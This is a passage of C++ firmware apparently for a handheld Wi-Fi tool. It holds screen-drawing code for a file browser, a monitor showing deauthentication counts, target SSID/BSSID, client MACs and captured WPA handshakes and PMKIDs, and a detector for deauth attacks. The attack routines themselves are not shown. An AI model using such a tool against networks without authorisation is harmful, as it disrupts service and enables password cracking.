  if (!dir || !dir.isDirectory()) {
    if (dir) dir.close();
    monitorSetFileInfo("Path unavailable");
    strncpy(monitorFilePath, "/", sizeof(monitorFilePath) - 1);
    monitorFilePath[sizeof(monitorFilePath) - 1] = '\0';
    return;
  }

  while (true) {
    File entry = dir.openNextFile();
    if (!entry) break;
    if (monitorFileCount >= MONITOR_FILE_MAX) {
      entry.close();
      continue;
    }

    String nm = entry.name();
    int slash = nm.lastIndexOf('/');
    if (slash >= 0 && slash + 1 < (int)nm.length()) nm = nm.substring(slash + 1);
    if (nm.length() == 0) {
      entry.close();
      continue;
    }

    const bool isDir = entry.isDirectory();
    if (!isDir && !monitorAllowFileName(nm.c_str())) {
      entry.close();
      continue;
    }

    MonitorFileEntry& out = monitorFiles[monitorFileCount++];
    strncpy(out.name, nm.c_str(), sizeof(out.name) - 1);
    out.name[sizeof(out.name) - 1] = '\0';
    out.isDir = isDir;
    out.size = isDir ? 0U : (uint32_t)entry.size();
    entry.close();
  }
  dir.close();

  if (monitorFileScroll < 0) monitorFileScroll = 0;
  if (monitorFileVisibleRows > 0) {
    int maxScroll = monitorFileCount - monitorFileVisibleRows;
    if (maxScroll < 0) maxScroll = 0;
    if (monitorFileScroll > maxScroll) monitorFileScroll = maxScroll;
  }
  monitorFileLastRefreshMs = millis();
  monitorSetFileInfo((monitorFileCount > 0) ? "Tap folder to open" : "No matching files");
}

static void monitorGoParentDir() {
  if (strcmp(monitorFilePath, "/") == 0) return;
  char nextPath[96];
  strncpy(nextPath, monitorFilePath, sizeof(nextPath) - 1);
  nextPath[sizeof(nextPath) - 1] = '\0';
  int len = (int)strlen(nextPath);
  while (len > 1 && nextPath[len - 1] == '/') {
    nextPath[len - 1] = '\0';
    len--;
  }
  while (len > 1 && nextPath[len - 1] != '/') {
    nextPath[len - 1] = '\0';
    len--;
  }
  if (len <= 1) {
    strcpy(nextPath, "/");
  }
  monitorFileScroll = 0;
  monitorLoadFileDir(nextPath);
}

static void monitorEnterDir(const char* name) {
  if (!name || !name[0]) return;
  char nextPath[96];
  if (strcmp(monitorFilePath, "/") == 0) {
    snprintf(nextPath, sizeof(nextPath), "/%s", name);
  } else {
    snprintf(nextPath, sizeof(nextPath), "%s/%s", monitorFilePath, name);
  }
  monitorFileScroll = 0;
  monitorLoadFileDir(nextPath);
}

// Track which yoink log seq we've already pushed to monitor
static uint32_t monitorYoinkLastSeq = 0;

static void monitorReset() {
  monitorLineCount = 0;
  monitorLastUpdateMs = 0;
  monitorLayoutDrawn = false;
  monitorDrawnCount = -1;
  for (int i = 0; i < MONITOR_MAX_LINES; i++) {
    monitorDrawnSig[i] = 0;
    monitorDrawnColor[i] = 0;
  }
  monitorLastPkts = sniffPacketCount;
  monitorLastBeacon = monBeaconHits;
  monitorLastHs = monHandshakeHits;
  monitorYoinkLastSeq = 0;
  monitorFileLastRefreshMs = 0;
  monitorFileScroll = 0;
  monitorFileCount = 0;
  monitorSetFileInfo("");
  // Reset Raw mode tracking
  rawMonLastPkts = 0;
  rawMonLastMgmt = 0;
  rawMonLastCtrl = 0;
  rawMonLastData = 0;
  rawMonLastBeacon = 0;
  rawMonLastHs = 0;
  rawMonLastDropped = 0;
  rawMonLastErrors = 0;
  rawMonLastPps = 0;
  
  monitorPushLine(TFT_CYAN, "MONITOR ONLINE");
  if (autoMode == AutoMode::Y0INK) {
    monitorPushLine(TFT_GREEN, "YOINK engine active");
  } else if (autoMode == AutoMode::JAMMIT) {
    monitorPushLine(TFT_RED, "JAMMIT telemetry active (safe)");
  } else if (autoMode == AutoMode::RAW) {
    monitorPushLine(TFT_CYAN, "RAW CAPTURE active");
  }
  monitorPushLine(TFT_WHITE, "Waiting for data...");
}

static void drawMonitor() {
  const int w = tft.width();
  const int h = tft.height();
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int boxX = 8;
  const int boxY = content.y + 40;
  const int boxW = w - 16;
  const int boxH = bottom.y - boxY - 6;

  if (!monitorLayoutDrawn) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("Monitor");
    drawUniversalBackground();

    btnMonitorBack = {bottom.x, bottom.y, 74, UI_BUTTON_H, "Back"};
    drawButton(btnMonitorBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

    tft.drawRect(boxX, boxY, boxW, boxH, TFT_DARKGREY);
    drawBorder();
    monitorLayoutDrawn = true;
    monitorDrawnCount = -1;
    for (int i = 0; i < MONITOR_MAX_LINES; i++) {
      monitorDrawnSig[i] = 0;
      monitorDrawnColor[i] = 0;
    }
  }

  // Rebuild tab buttons every draw so hitboxes stay valid.
  const int tabW = 60;
  const int tabH = 20;
  const int tabY = content.y + 16;
  btnMonitorTab1 = {110, tabY, tabW, tabH, "LIVE"};
  btnMonitorTab2 = {173, tabY, tabW, tabH, "FILES"};

  const bool isYoink  = (autoMode == AutoMode::Y0INK  && YoinkEngine::isRunning());
  const bool isJammit = (autoMode == AutoMode::JAMMIT);
  const bool armed = isYoink || isJammit || (lockChannel && sniffActive && (rawCaptureActive || pcapCaptureActive));

  // Refresh only the status/header strip and tab area.
  tft.fillRect(108, 48, w - 116, 34, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(armed ? TFT_GREEN : TFT_YELLOW, TFT_BLACK);
  if (isYoink) {
    char yHdr[48];
    snprintf(yHdr, sizeof(yHdr), "YOINK: %s  HS:%d PMKID:%d",
             YoinkEngine::getStateStr(),
             YoinkEngine::getHandshakeCount(),
             YoinkEngine::getPmkidCount());
    tft.drawString(yHdr, 110, 50);
  } else if (isJammit) {
    char jHdr[80];
    snprintf(jHdr, sizeof(jHdr), "JAMMIT  D:%lu  C:%u  HS:%u",
             (unsigned long)jammitDeauthCount, (unsigned)jammitClientCount,
             (unsigned)monHandshakeHits);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString(jHdr, 110, 50);
  } else {
    tft.drawString(armed ? "LIVE CAPTURE ACTIVE" : "Needs: LOCK + SNIFF + RECORD", 110, 50);
  }

  uint16_t liveColor = (monitorMode == MonitorMode::LIVE) ? TFT_DARKGREEN : TFT_DARKGREY;
  uint16_t filesColor = (monitorMode == MonitorMode::FILES) ? TFT_DARKGREEN : TFT_DARKGREY;
  drawButton(btnMonitorTab1, liveColor, TFT_WHITE, TFT_WHITE);
  drawButton(btnMonitorTab2, filesColor, TFT_WHITE, TFT_WHITE);

  if (monitorMode == MonitorMode::FILES) {
    const int ctlGap = 6;
    btnMonitorUpDir = {btnMonitorBack.x + btnMonitorBack.w + ctlGap, bottom.y, 44, UI_BUTTON_H, ".."};
    btnMonitorUp = {btnMonitorUpDir.x + btnMonitorUpDir.w + ctlGap, bottom.y, 36, UI_BUTTON_H, "^"};
    btnMonitorDown = {btnMonitorUp.x + btnMonitorUp.w + ctlGap, bottom.y, 36, UI_BUTTON_H, "v"};
    drawButton(btnMonitorUpDir, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnMonitorDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

    if (monitorFileLastRefreshMs == 0) {
      monitorLoadFileDir(monitorFilePath);
    }

    tft.fillRect(boxX + 1, boxY + 1, boxW - 2, boxH - 2, TFT_BLACK);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    String pathLine = String("SD: ") + monitorFilePath;
    while (pathLine.length() > 4 && tft.textWidth(pathLine) > (boxW - 10)) {
      pathLine.remove(pathLine.length() - 1);
    }
    tft.drawString(pathLine, boxX + 4, boxY + 4);

    monitorFileListX = boxX + 4;
    monitorFileListY = boxY + 20;
    monitorFileListW = boxW - 8;
    monitorFileListH = boxH - 40;
    monitorFileRowH = 14;
    monitorFileVisibleRows = monitorFileListH / monitorFileRowH;
    if (monitorFileVisibleRows < 1) monitorFileVisibleRows = 1;

    int maxScroll = monitorFileCount - monitorFileVisibleRows;
    if (maxScroll < 0) maxScroll = 0;
    monitorFileScroll = clampi(monitorFileScroll, 0, maxScroll);

    for (int r = 0; r < monitorFileVisibleRows; r++) {
      const int idx = monitorFileScroll + r;
      const int y = monitorFileListY + (r * monitorFileRowH);
      tft.fillRect(monitorFileListX, y, monitorFileListW, monitorFileRowH - 1, TFT_BLACK);
      if (idx >= monitorFileCount) continue;
      const MonitorFileEntry& e = monitorFiles[idx];
      tft.setTextColor(e.isDir ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      String line = String(e.isDir ? "[D] " : "    ") + e.name;
      while (line.length() > 4 && tft.textWidth(line) > (monitorFileListW - 64)) {
        line.remove(line.length() - 1);
      }
      tft.drawString(line, monitorFileListX + 2, y + 2);
      if (!e.isDir) {
        char sz[16];
        snprintf(sz, sizeof(sz), "%lu", (unsigned long)e.size);
        tft.setTextDatum(TR_DATUM);
        tft.setTextColor(0x7BCF, TFT_BLACK);
        tft.drawString(sz, monitorFileListX + monitorFileListW - 4, y + 2);
        tft.setTextDatum(TL_DATUM);
      }
    }
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(monitorFileInfo, boxX + 4, boxY + boxH - 14);
  } else {
    // Redraw only changed monitor lines.
    const int lineH = 12;
    const int textX = boxX + 16;
    tft.setTextDatum(TL_DATUM);
    for (int i = 0; i < MONITOR_MAX_LINES; i++) {
      const bool hasLine = (i < monitorLineCount);
      const char* txt = hasLine ? monitorLines[i].text : "";
      const uint16_t col = hasLine ? monitorLines[i].color : TFT_WHITE;
      const uint32_t sig = hashText(txt);
      if (monitorDrawnSig[i] == sig && monitorDrawnColor[i] == col && monitorDrawnCount == monitorLineCount) {
        continue;
      }
      int y = boxY + 8 + (i * lineH);
      tft.fillRect(textX - 2, y, boxW - 22, lineH - 1, TFT_BLACK);
      if (hasLine) {
        tft.setTextColor(col, TFT_BLACK);
        tft.drawString(txt, textX, y);
      }
      monitorDrawnSig[i] = sig;
      monitorDrawnColor[i] = col;
    }
    monitorDrawnCount = monitorLineCount;

    // Simple cursor animation
    uint8_t spin = (uint8_t)((millis() / 200) & 0x03);
    const char spinner[4] = {'|', '/', '-', '\\'};
    char cur[8];
    snprintf(cur, sizeof(cur), "%c", spinner[spin]);
    tft.fillRect(boxX + boxW - 16, boxY + boxH - 15, 10, 12, TFT_BLACK);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(cur, boxX + boxW - 14, boxY + boxH - 14);
  }
  uiLogLayout("drawMonitor", content, bottom);
  uiLogButtonRect("Monitor.Back", btnMonitorBack);
}

static void monitorTick() {
  if (screen != ScreenId::MONITOR) return;

  uint32_t now = millis();
  if (now - monitorLastUpdateMs < (uint32_t)cfg.telemetry_monitorIntervalMs) return;
  monitorLastUpdateMs = now;

  if (monitorMode == MonitorMode::FILES) {
    if ((now - monitorFileLastRefreshMs) > 1500U) {
      monitorLoadFileDir(monitorFilePath);
      drawMonitor();
    }
    return;
  }

  const bool isYoink  = (autoMode == AutoMode::Y0INK  && YoinkEngine::isRunning());
  const bool isJammit = (autoMode == AutoMode::JAMMIT);
  const bool armed = isYoink || isJammit || (lockChannel && sniffActive && (rawCaptureActive || pcapCaptureActive));
  const uint32_t pktsNow = sniffPacketCount;
  const uint32_t pktDelta = pktsNow - monitorLastPkts;
  monitorLastPkts = pktsNow;

  if (isJammit) {
    if (monitorMode == MonitorMode::LIVE) {
      // Target summary
      monitorPushLine(TFT_RED,     "TARGET: %s", target.ssid.isEmpty() ? "(hidden)" : target.ssid.c_str());
      monitorPushLine(TFT_YELLOW,  "BSSID: %s  CH%d", target.bssid.c_str(), target.channel);
      // Session time
      uint32_t elapsed = (millis() - jammitSessionStartMs) / 1000;
      monitorPushLine(TFT_CYAN,    "ELAPSED: %lu s", elapsed);
      monitorPushLine(TFT_WHITE,   "");
      // Deauth/score stats
      monitorPushLine(TFT_RED,     "DEAUTHS SENT: %lu", (unsigned long)jammitDeauthCount);
      monitorPushLine(TFT_YELLOW,  "LAST SCORE:   %u",  (unsigned)jammitLastScore);
      monitorPushLine(monHandshakeHits > 0 ? TFT_GREEN : TFT_DARKGREY,
                      "EAPOL/HS CAP: %u  (handshakes.pcap)", (unsigned)monHandshakeHits);
      monitorPushLine(TFT_WHITE,   "");
      // Clients discovered via sniffer
      monitorPushLine(TFT_CYAN,    "CLIENTS SEEN: %u", (unsigned)jammitClientCount);
      for (uint8_t i = 0; i < jammitClientCount && i < 4; i++) {
        const uint8_t* m = jammitClientMacs[i];
        monitorPushLine(TFT_MAGENTA,
          "  [%u] %02X:%02X:%02X:%02X:%02X:%02X", i + 1,
          m[0], m[1], m[2], m[3], m[4], m[5]);
      }
      if (jammitClientCount > 4)
        monitorPushLine(TFT_DARKGREY, "  ...+%u more", jammitClientCount - 4);
      monitorPushLine(TFT_WHITE,   "");
      // Packet throughput
      monitorPushLine(TFT_CYAN,    "PKTS +%lu   PPS %d", (unsigned long)pktDelta, sniffPps);
    } else {
      // FILES VIEW for JAMMIT
      monitorPushLine(TFT_RED,    "JAMMIT CAPTURE FILES");
      monitorPushLine(TFT_WHITE,  "");
      if (captureDir[0]) {
        monitorPushLine(TFT_YELLOW, "DIR: %s", captureDir);
      }
      monitorPushLine(TFT_WHITE,  "");
      // Session log
      if (sdReady && jammitSessionLogPath[0]) {
        File f = SD.open(jammitSessionLogPath, FILE_READ);
        size_t sz = f ? (size_t)f.size() : 0;
        if (f) f.close();
        monitorPushLine(sz ? TFT_GREEN : TFT_DARKGREY,
          "jammit_session.log  %u B", (unsigned)sz);
      }
      // Deauth PCAP
      if (sdReady && jammitDeauthPcapPath[0]) {
        File f = SD.open(jammitDeauthPcapPath, FILE_READ);
        size_t sz = f ? (size_t)f.size() : 0;
        if (f) f.close();
        // Each deauth record = 16 (pcap hdr) + 26 (frame) = 42 bytes, minus global header 24
        uint32_t frames = sz > 24 ? (sz - 24) / 42 : 0;
        monitorPushLine(sz ? TFT_GREEN : TFT_DARKGREY,
          "jammit_deauths.pcap %u B (%lu pkts)", (unsigned)sz, frames);
      }
      monitorPushLine(TFT_WHITE, "");
      // Core PCAPs
      monitorPushLine(TFT_CYAN, "beacon.pcap   %lu writes", (unsigned long)fileWriteCountBeacon);
      monitorPushLine(TFT_CYAN, "handshakes.pcap %lu writes", (unsigned long)fileWriteCountHandshake);
      monitorPushLine(TFT_WHITE, "");
      if (fileTotalErrors > 0)
        monitorPushLine(TFT_RED, "WRITE ERRORS: %lu", (unsigned long)fileTotalErrors);
      else
        monitorPushLine(TFT_GREEN, "All writes OK");
    }
  } else if (isYoink) {
    // === YOINK MODE: drain log ring into monitor display ===
    if (monitorMode == MonitorMode::LIVE) {
      // Push new log entries from yoink engine ring buffer
      uint8_t logCount = YoinkEngine::getLogCount();
      bool anyNew = false;
      for (uint8_t i = 0; i < logCount; i++) {
        const YoinkLogEntry* e = YoinkEngine::getLogEntry(i);
        if (!e || e->seq <= monitorYoinkLastSeq) continue;
        monitorYoinkLastSeq = e->seq;
        anyNew = true;
        // Color by severity: 0=info(cyan), 1=success(green), 2=warn(yellow), 3=err(red)
        uint16_t color = TFT_CYAN;
        if (e->severity == 1) color = TFT_GREEN;
        else if (e->severity == 2) color = TFT_YELLOW;
        else if (e->severity == 3) color = TFT_RED;
        monitorPushLine(color, "%s", e->msg);
      }
      if (!anyNew && (now % 5000 < 500)) {
        // Periodic stats line when no new events
        monitorPushLine(TFT_DARKGREY, "pkts:%lu deauth:%lu nets:%d",
                        (unsigned long)YoinkEngine::getPacketCount(),
                        (unsigned long)YoinkEngine::getDeauthCount(),
                        YoinkEngine::getNetworkCount());
      }
    } else {
      // FILES VIEW for YOINK
      monitorPushLine(TFT_CYAN, "YOINK CAPTURE FILES");
      monitorPushLine(TFT_WHITE, "");
      // Show handshakes
      uint8_t hsCount = YoinkEngine::getHandshakeCount();
      uint8_t pmkCount = YoinkEngine::getPmkidCount();
      monitorPushLine(TFT_GREEN, "Handshakes: %d captured", hsCount);
      for (uint8_t i = 0; i < YoinkEngine::getTotalHandshakeSlots(); i++) {
        const YoinkHandshake* hs = YoinkEngine::getHandshake(i);
        if (hs && hs->hasValidPair()) {
          monitorPushLine(hs->saved ? TFT_GREEN : TFT_YELLOW,
                          "  %s mask=0x%02X %s", hs->ssid, hs->capturedMask,
                          hs->saved ? "SAVED" : "unsaved");
        }
      }
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_GREEN, "PMKIDs: %d captured", pmkCount);
      for (uint8_t i = 0; i < pmkCount; i++) {
        const YoinkPmkid* p = YoinkEngine::getPmkid(i);
        if (p) {
          monitorPushLine(p->saved ? TFT_GREEN : TFT_YELLOW,
                          "  %s %s", p->ssid, p->saved ? "SAVED" : "unsaved");
        }
      }
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_CYAN, "Path: /captures/<SSID>/Handshakes/");
    }
  } else if (monitorMode == MonitorMode::LIVE) {
    // LIVE DATA VIEW (non-YOINK modes)
    if (!armed) {
      monitorPushLine(TFT_YELLOW, "WAIT lock=%d sniff=%d rec=%d",
                      lockChannel ? 1 : 0, sniffActive ? 1 : 0, (rawCaptureActive || pcapCaptureActive) ? 1 : 0);
    } else if (autoMode == AutoMode::RAW) {
      // RAW mode: in-place updates, only redraw when data changes
      bool changed = false;
      
      if (sniffPacketCount != rawMonLastPkts || sniffPps != rawMonLastPps) {
        monitorUpdateLine(0, TFT_CYAN, "PACKETS: %lu   PPS: %d", (unsigned long)sniffPacketCount, sniffPps);
        rawMonLastPkts = sniffPacketCount;
        rawMonLastPps = sniffPps;
        changed = true;
      }
      
      if (sniffDroppedPackets != rawMonLastDropped || fileTotalErrors != rawMonLastErrors) {
        monitorUpdateLine(1, TFT_YELLOW, "DROPPED: %lu   ERRORS: %lu", 
                         (unsigned long)sniffDroppedPackets, (unsigned long)fileTotalErrors);
        rawMonLastDropped = sniffDroppedPackets;
        rawMonLastErrors = fileTotalErrors;
        changed = true;
      }
      
      // Ensure blank line at index 2
      if (monitorLines[2].text[0] != '\0') {
        monitorUpdateLine(2, TFT_WHITE, "");
      }
      
      if (monPktMgmt != rawMonLastMgmt || monPktCtrl != rawMonLastCtrl || monPktData != rawMonLastData) {
        monitorUpdateLine(3, TFT_GREEN, "MGMT: %lu   CTRL: %lu", 
                         (unsigned long)monPktMgmt, (unsigned long)monPktCtrl);
        monitorUpdateLine(4, TFT_GREEN, "DATA: %lu", (unsigned long)monPktData);
        rawMonLastMgmt = monPktMgmt;
        rawMonLastCtrl = monPktCtrl;
        rawMonLastData = monPktData;
        changed = true;
      }
      
      // Ensure blank line at index 5
      if (monitorLines[5].text[0] != '\0') {
        monitorUpdateLine(5, TFT_WHITE, "");
      }
      
      if (monBeaconHits != rawMonLastBeacon || monHandshakeHits != rawMonLastHs) {
        monitorUpdateLine(6, TFT_MAGENTA, "BEACON: %lu   HANDSHAKE: %lu",
                         (unsigned long)monBeaconHits, (unsigned long)monHandshakeHits);
        rawMonLastBeacon = monBeaconHits;
        rawMonLastHs = monHandshakeHits;
        changed = true;
      }
      
      // Only redraw if something changed
      if (changed) {
        drawMonitor();
        return; // Skip the drawMonitor() at the end of monitorTick()
      }
    } else {
      // Other modes: use scrolling display
      monitorPushLine(TFT_CYAN, "PKT DELTA +%lu   PPS %d",
                      (unsigned long)pktDelta, sniffPps);
      monitorPushLine(TFT_CYAN, "DROPPED %lu   ERRORS %lu",
                      (unsigned long)sniffDroppedPackets, (unsigned long)fileTotalErrors);
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_GREEN, "LAST PKT: %s",
                      monitorPktTypeStr(monLastType));
      monitorPushLine(TFT_GREEN, "LEN %u bytes   RSSI %d dBm",
                      (unsigned)monLastLen, monLastRssi);
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_YELLOW, "MGMT %lu   CTRL %lu",
                      (unsigned long)monPktMgmt, (unsigned long)monPktCtrl);
      monitorPushLine(TFT_YELLOW, "DATA %lu", (unsigned long)monPktData);
      monitorPushLine(TFT_WHITE, "");
      monitorPushLine(TFT_MAGENTA, "BEACON %lu   HANDSHAKE %lu",
                      (unsigned long)monBeaconHits, (unsigned long)monHandshakeHits);
      if (autoMode == AutoMode::JAMMIT) {
        monitorPushLine(TFT_RED, "JAMMIT SCORE:%u DEAUTH:%lu", 
                        (unsigned)jammitLastScore, (unsigned long)jammitDeauthCount);
      }
    }
  } else {
    // FILES VIEW (non-YOINK modes)
    monitorPushLine(TFT_CYAN, "PCAP FILES BEING WRITTEN");
    monitorPushLine(TFT_WHITE, "");
    
    monitorPushLine(TFT_WHITE, "");
    monitorPushLine(TFT_GREEN, "beacon.pcap");
    monitorPushLine(TFT_CYAN, "  AP beacons: %lu writes",
                    (unsigned long)fileWriteCountBeacon);
    
    monitorPushLine(TFT_WHITE, "");
    monitorPushLine(TFT_GREEN, "handshakes.pcap");
    monitorPushLine(TFT_CYAN, "  WPA/EAPOL: %lu writes",
                    (unsigned long)fileWriteCountHandshake);
    
    monitorPushLine(TFT_WHITE, "");
    if (fileTotalErrors > 0) {
      monitorPushLine(TFT_RED, "WRITE ERRORS: %lu",
                      (unsigned long)fileTotalErrors);
    } else {
      monitorPushLine(TFT_GREEN, "All writes OK");
    }
  }

  drawMonitor();
}

static void clearReconConsoleArea() {
  const int w = tft.width();
  tft.fillRect(9, reconConsoleY + 16, w - 18, reconConsoleH - 18, TFT_BLACK);
}

// Draw Recon screen with hunter stats
static void drawRecon() {
  const int w = tft.width();
  const int h = tft.height();
  const int statsY = 34;
  const int topY = statsY;

  // Stats panel under title row, to the left of the hypercube.
  const int statsX = 0;
  // Match console right edge (console rect ends at x = w - 9).
  const int statsW = max(120, w - statsX - 8);
  const int statsTargetArea = (w * h * 20) / 100;  // ~20% of total screen area
  const int statsH = clampi(statsTargetArea / max(1, statsW), 34, 96);

  // Console log area
  reconConsoleY = statsY + statsH + 4;
  reconConsoleH = h - reconConsoleY - 42;

  // Control buttons (bottom)
  const int btnW = 56;
  const int btnH = 30;
  const int btnY = h - 36;
  const int btnGap = 6;
  const int totalWidth = btnW * 4 + btnGap * 3;
  const int startX = (w - totalWidth) / 2;
  btnReconBack = {startX, btnY, btnW, btnH, "BACK"};
  btnReconStart = {startX + (btnW + btnGap), btnY, btnW, btnH, reconActive ? "STOP" : "START"};
  btnReconClear = {startX + (btnW + btnGap) * 2, btnY, btnW, btnH, "RESET"};
  Button btnReconExport = {startX + (btnW + btnGap) * 3, btnY, btnW, btnH, "SAVE"};

  if (!reconLayoutDrawn) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("DEAUTH HUNTER");
    drawUniversalBackground();

    tft.drawRect(statsX, statsY, statsW, statsH, TFT_DARKGREY);
    tft.fillRect(statsX + 1, statsY + 1, statsW - 2, statsH - 2, 0x0841);

    tft.drawRect(8, reconConsoleY, w - 16, reconConsoleH, TFT_DARKGREY);
    tft.fillRect(9, reconConsoleY + 1, w - 18, reconConsoleH - 2, TFT_BLACK);

    drawBorder();
    reconLayoutDrawn = true;
  }

  // Console header + run-state indicator (kept out of stats panel to avoid hypercube overlap).
  tft.fillRect(9, reconConsoleY + 1, w - 18, 12, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("SRC_MAC            CH  RS TYPE PKT", 12, reconConsoleY + 4);
  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(reconActive ? TFT_GREEN : TFT_RED, TFT_BLACK);
  tft.drawString(reconActive ? "[HUNTING]" : "[STOPPED]", w - 12, reconConsoleY + 4);
  tft.setTextDatum(TL_DATUM);

  // Dynamic stats values + status indicator
  const DeauthStats& stats = DeauthHunter::getStats();
  tft.fillRect(statsX + 1, statsY + 1, statsW - 2, statsH - 2, 0x0841);
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, 0x0841);
  tft.drawString("Deauth:", statsX + 4, statsY + 4);
  tft.drawString("Disassoc:", statsX + (statsW / 2), statsY + 4);
  tft.drawString("Attackers:", statsX + 4, statsY + 20);
  tft.drawString("Ch:", statsX + (statsW / 2), statsY + 20);
  tft.setTextColor(TFT_WHITE, 0x0841);
  char deauthStr[12];
  char disassocStr[12];
  char attackersStr[12];
  snprintf(deauthStr, sizeof(deauthStr), "%lu", (unsigned long)stats.total_deauths);
  snprintf(disassocStr, sizeof(disassocStr), "%lu", (unsigned long)stats.total_disassocs);
  snprintf(attackersStr, sizeof(attackersStr), "%u", (unsigned)stats.unique_sources);
  tft.drawString(deauthStr, statsX + 46, statsY + 4);
  tft.drawString(disassocStr, statsX + (statsW / 2) + 50, statsY + 4);
  tft.drawString(attackersStr, statsX + 58, statsY + 20);
  char chStr[16];
  snprintf(chStr, sizeof(chStr), "%d/%d", DeauthHunter::getCurrentChannel(), stats.most_active_channel ? stats.most_active_channel : 1);
  tft.drawString(chStr, statsX + (statsW / 2) + 22, statsY + 20);

  // Dynamic controls (START/STOP label changes)
  drawButton(btnReconStart, reconActive ? TFT_RED : TFT_GREEN, TFT_WHITE, TFT_WHITE);
  drawButton(btnReconClear, TFT_ORANGE, TFT_WHITE, TFT_WHITE);
  drawButton(btnReconExport, TFT_BLUE, TFT_DARKGREY, TFT_WHITE);
  drawButton(btnReconBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  // First entry into screen should reset incremental draw tracking.
  if (reconLastLogCount == 0 && reconLastTotalEvents == 0) {
    reconLastDrawChannel = DeauthHunter::getCurrentChannel();
  }
}

// Helper: Draw console log entries
static void drawReconConsole(bool fullRedraw = false) {
  const int w = tft.width();
  const int lineHeight = 8;
  const int maxVisibleLines = (reconConsoleH - 16) / lineHeight;  // Reserve space for header

  if (fullRedraw) {
    // Full redraw - clear console area first
    clearReconConsoleArea();
  }
  
  uint16_t logCount = DeauthHunter::getLogCount();
  if (logCount == 0) {
    reconLastLogCount = 0;
    return;
  }

  // Determine what to redraw
  uint16_t endIdx = logCount;
  if (!fullRedraw && logCount <= reconLastLogCount) return;  // No new entries

  // Draw visible log entries (newest at bottom, scrolling up)
  uint16_t displayStart = (logCount > maxVisibleLines) ? (logCount - maxVisibleLines) : 0;

  tft.setTextDatum(TL_DATUM);
  tft.setTextFont(1);
  tft.setTextSize(1);

  for (uint16_t i = displayStart; i < endIdx; i++) {
    const DeauthEvent* evt = DeauthHunter::getLogEntry(i);
    if (!evt) continue;

    // Calculate Y position (scroll up as new entries arrive)
    int lineIdx = i - displayStart;
    int y = reconConsoleY + 14 + (lineIdx * lineHeight);

    if (y + lineHeight > reconConsoleY + reconConsoleH) break;  // Off screen

    // Full source MAC for live triage.
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             evt->src_mac[0], evt->src_mac[1], evt->src_mac[2],
             evt->src_mac[3], evt->src_mac[4], evt->src_mac[5]);

    const char* pktType = evt->is_disassoc ? "DISAS" : "DEAUTH";
    // Format line
    char line[64];
    snprintf(line, sizeof(line), "%s %2d %3d %c %s",
             macStr, evt->channel, evt->rssi,
             evt->is_disassoc ? 'D' : 'A', pktType);

    // Color code by RSSI strength
    uint16_t color = TFT_GREEN;
    if (evt->rssi > -50) color = TFT_RED;        // Very close
    else if (evt->rssi > -70) color = TFT_YELLOW;  // Medium
    else color = TFT_CYAN;                       // Far

    tft.setTextColor(color, TFT_BLACK);
    tft.drawString(line, 12, y);
  }

  reconLastLogCount = logCount;  
}

// Periodic update for Recon screen
static void reconTick() {
  if (screen != ScreenId::RECON) return;

  if (!reconActive) return;

  // Update DeauthHunter channel hopping
  DeauthHunter::update();

  const DeauthStats& stats = DeauthHunter::getStats();
  uint32_t totalEvents = DeauthHunter::getTotalEvents();
  uint8_t currentCh = DeauthHunter::getCurrentChannel();

  // Check if we have new events or channel changed
  bool newEvents = (totalEvents > reconLastTotalEvents);
  bool channelChanged = (currentCh != reconLastDrawChannel);

  if (!newEvents && !channelChanged) return;

  // Update stats panel (partial redraw)
  if (newEvents || channelChanged) {
    const int w = tft.width();
    const int h = tft.height();
    const int topY = 34;
    const int statsX = 0;
    const int statsY = topY;
    // Match console right edge (console rect ends at x = w - 9).
    const int statsW = max(120, w - statsX - 8);
    const int statsTargetArea = (w * h * 20) / 100;  // ~20% of total screen area
    const int statsH = clampi(statsTargetArea / max(1, statsW), 34, 96);

    // Redraw compact stats panel values.
    tft.fillRect(statsX + 1, statsY + 1, statsW - 2, statsH - 2, 0x0841);

    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, 0x0841);
    tft.drawString("Deauth:", statsX + 4, statsY + 4);
    tft.drawString("Disassoc:", statsX + (statsW / 2), statsY + 4);
    tft.drawString("Attackers:", statsX + 4, statsY + 20);
    tft.drawString("Ch:", statsX + (statsW / 2), statsY + 20);
    tft.setTextColor(TFT_WHITE, 0x0841);
    char deauthStr[12];
    char disassocStr[12];
    char attackersStr[12];
    snprintf(deauthStr, sizeof(deauthStr), "%lu", (unsigned long)stats.total_deauths);
    snprintf(disassocStr, sizeof(disassocStr), "%lu", (unsigned long)stats.total_disassocs);
    snprintf(attackersStr, sizeof(attackersStr), "%u", (unsigned)stats.unique_sources);
    tft.drawString(deauthStr, statsX + 46, statsY + 4);
    tft.drawString(disassocStr, statsX + (statsW / 2) + 50, statsY + 4);
    tft.drawString(attackersStr, statsX + 58, statsY + 20);

    char chStr[16];
    snprintf(chStr, sizeof(chStr), "%d/%d", currentCh, stats.most_active_channel ? stats.most_active_channel : 1);
